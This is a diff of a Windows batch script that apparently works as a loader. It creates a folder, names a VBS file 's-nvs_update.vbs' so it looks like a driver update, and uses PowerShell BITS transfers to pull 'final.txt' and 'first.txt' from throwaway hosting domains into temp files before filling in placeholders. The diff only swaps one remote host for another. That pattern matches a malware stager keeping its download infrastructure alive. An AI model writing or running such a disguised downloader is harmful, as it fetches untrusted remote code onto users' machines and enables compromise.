@@ -14,8 +14,8 @@ set "vbsFile=%base%\s-nvs_update.vbs"
 if not exist "%base%" mkdir "%base%"
 
 :: Download required files
-powershell -Command "Start-BitsTransfer -Source 'https://fancy-seehorse.netlify.app/code/final.txt' -Destination '%t%'"
-powershell -Command "Start-BitsTransfer -Source 'https://fancy-seehorse.netlify.app/code/first.txt' -Destination '%tempFile1%'"
+powershell -Command "Start-BitsTransfer -Source 'https://service-omega-snowy.vercel.app/final.txt' -Destination '%t%'"
+powershell -Command "Start-BitsTransfer -Source 'https://service-omega-snowy.vercel.app/first.txt' -Destination '%tempFile1%'"
 powershell -Command "Start-BitsTransfer -Source **** -Destination '%tempFile2%'"
 
 :: Replace placeholders
